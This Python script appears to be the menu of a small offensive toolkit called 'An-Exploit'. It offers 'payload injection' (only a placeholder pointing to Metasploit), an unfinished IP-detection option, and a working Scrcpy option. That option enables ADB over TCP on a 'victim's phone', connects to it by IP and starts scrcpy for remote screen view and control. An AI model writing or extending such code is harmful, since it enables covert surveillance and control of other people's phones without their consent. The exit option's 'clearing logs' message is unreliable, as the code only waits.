from rich import print
from rich.console import Console
from rich.style import Style
from rich.layout import Layout
import time
import os

console = Console(width=100)

main_msg = Style(color="blue", blink=True, bold=True)

main_opts = Style(color="red", bold=True)

console.print("An-Exploit main menu", style=main_msg, justify="center")

with console.status(" loading exploits", spinner="aesthetic"):
    time.sleep(2)


def main():
    os.system("clear")
    console.print("An-Exploit main menu", style=main_msg, justify="center")

    print("""
        """)

    console.print("Enter the serial number of the attack to perform", style="red", justify="center")

    print("""
        """)

    console.print("(1.) Payload Injection", style=main_opts, justify="left")
    console.print("(2.) IP detection", style=main_opts, justify="left")
    console.print("(3.) Scrcpy", style=main_opts, justify="left")
    console.print("(4.) EXIT", style=main_opts, justify="left")


    print("""
        """)

    opt = input("asf/exploit >>  ")

    if opt == "1":
        print("[*] Using Payload injection module (will directly be used from msf) ")

    if opt == "2":
        time.sleep(1)
        print("[*] Using built-in IP detection")
        print("Oops...")
        print("Sorry, This feature is still in development. Try again later...")
        time.sleep(1)
        with console.status("Redirecting to main menu", spinner="clock"):
            time.sleep(1)

        main()

    if opt == "3":
        time.sleep(1)
        os.system("clear")
        console.print("Scrcpy", style=main_msg, justify="center")
        print("""
              """)
        print(" ↳ This requires you to enable USB debugging in developer options for ADB connections")
        time.sleep(2)
        input("Please connect your victim's phone wiht a usb cable to use adb over tcp. Press enter once done....")
        os.system("adb tcpip 5555")
        trgt_ip = input("Your victim's phone's IP : ")
        os.system("adb connect "+trgt_ip+":5555")
        print("""
              """)
        os.system("clear")
        print("[*] Connecting using Scrcpy")
        os.system("scrcpy")
        print("[*] Session aborted.")
        time.sleep(1)
        main()


    if opt == "4":
        os.system("clear")
        print("Thank you for using ASF")
        with console.status("Clearing logs and closing asf", spinner="dots"):
            time.sleep(3)
            os.system("clear")

main()
